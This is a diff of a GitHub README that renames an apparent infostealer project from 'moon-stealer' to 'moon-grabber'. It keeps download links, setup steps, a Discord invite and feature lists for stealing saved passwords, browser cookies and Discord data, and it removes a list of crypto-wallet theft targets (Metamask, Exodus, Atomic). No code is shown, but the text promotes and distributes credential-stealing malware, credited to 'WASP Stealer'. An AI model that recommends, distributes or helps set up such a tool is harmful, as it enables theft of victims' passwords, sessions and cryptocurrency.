@@ -5,7 +5,7 @@
  
 </p>
 <p align="center">
-<a href="https://github.com/Yuvi5001/moon-stealer/archive/refs/heads/main.zip">Fast Download</a> ㅤ•ㅤ
+<a href="https://github.com/Yuvi5001/moon-grabber/archive/refs/heads/main.zip">Fast Download</a> ㅤ•ㅤ
 <a href="https://discord.gg/fDta8XNc">Discord</a> ㅤ•ㅤ
 </p>
 </p>
@@ -14,16 +14,16 @@
 </p>
 <p align="center">
 
-[contributors-shield]: https://img.shields.io/github/contributors/yuvi5001/moon-stealer.svg?style=for-the-badge
-[contributors-url]: https://github.com/yuvi5001/moon-stealer/graphs/contributors
-[forks-shield]: https://img.shields.io/github/forks/yuvi5001/moon-stealer.svg?style=for-the-badge
-[forks-url]: https://github.com/yuvi5001/moon-stealer/network/members
-[stars-shield]: https://img.shields.io/github/stars/yuvi5001/moon-stealer.svg?style=for-the-badge
-[stars-url]: https://github.com/Yuvi5001/moon-stealer/stargazers
-[issues-shield]: https://img.shields.io/github/issues/yuvi5001/moon-stealer.svg?style=for-the-badge
-[issues-url]: https://github.com/Yuvi5001/moon-stealer/issues
-[license-shield]: https://img.shields.io/github/license/yuvi5001/moon-stealer.svg?style=for-the-badge
-[license-url]: https://github.com/Yuvi5001/moon-stealer/blob/main/LICENSE.md
+[contributors-shield]: https://img.shields.io/github/contributors/yuvi5001/moon-grabber.svg?style=for-the-badge
+[contributors-url]: https://github.com/yuvi5001/moon-grabber/graphs/contributors
+[forks-shield]: https://img.shields.io/github/forks/yuvi5001/moon-grabber.svg?style=for-the-badge
+[forks-url]: https://github.com/yuvi5001/moon-grabber/network/members
+[stars-shield]: https://img.shields.io/github/stars/yuvi5001/moon-grabber.svg?style=for-the-badge
+[stars-url]: https://github.com/Yuvi5001/moon-grabber/stargazers
+[issues-shield]: https://img.shields.io/github/issues/yuvi5001/moon-grabber.svg?style=for-the-badge
+[issues-url]: https://github.com/Yuvi5001/moon-grabber/issues
+[license-shield]: https://img.shields.io/github/license/yuvi5001/moon-grabber.svg?style=for-the-badge
+[license-url]: https://github.com/Yuvi5001/moon-grabber/blob/main/LICENSE.md
 
 [![Contributors][contributors-shield]][contributors-url]
 [![Forks][forks-shield]][forks-url]
@@ -42,7 +42,7 @@
 ### Setup
 
 ```sh-session
-1. Download moon stealer (https://codeload.github.com/Yuvi5001/moon-stealer/zip/refs/heads/main)
+1. Download moon grabber (https://codeload.github.com/Yuvi5001/moon-grabber/zip/refs/heads/main)
 
 2. Extract zip file
 
@@ -60,7 +60,7 @@
 
 Enjoy!
 
-NOTE: When Opening Moon-Stealer Just Tap "main.py" to Open Everytime!
+NOTE: When Opening Moon-Grabber Just Tap "main.py" to Open Everytime!
 
 NOTE: Make sure you have Python 3.10+ and Added to Path.
 
@@ -88,12 +88,6 @@ NOTE: Make sure you have Python 3.10+ and Added to Path.
 
   - Steal Saved Passwords
   - Steal Cookies
-
-- Wallet Stealer
-
-  - Steal Metamask wallets
-  - Steal Exodus Wallet
-  - Steal Atomic Wallet
 
 - Discord Stealer
 
@@ -129,11 +123,11 @@ NOTE: Make sure you have Python 3.10+ and Added to Path.
 
 ## License
 
-Moon Stealer is licensed under the <a href="https://mit-license.org/">MIT License</a>.
+Moon Grabber is licensed under the <a href="https://mit-license.org/">MIT License</a>.
 
 ## Errors?
 
-- Make an [issue](https://github.com/Yuvi5001/moon-stealer/issues)
+- Make an [issue](https://github.com/Yuvi5001/moon-grabber/issues)
 - Join the [discord](https://discord.gg/fnNd26Depz)
 
 Credits: WASP Stealer
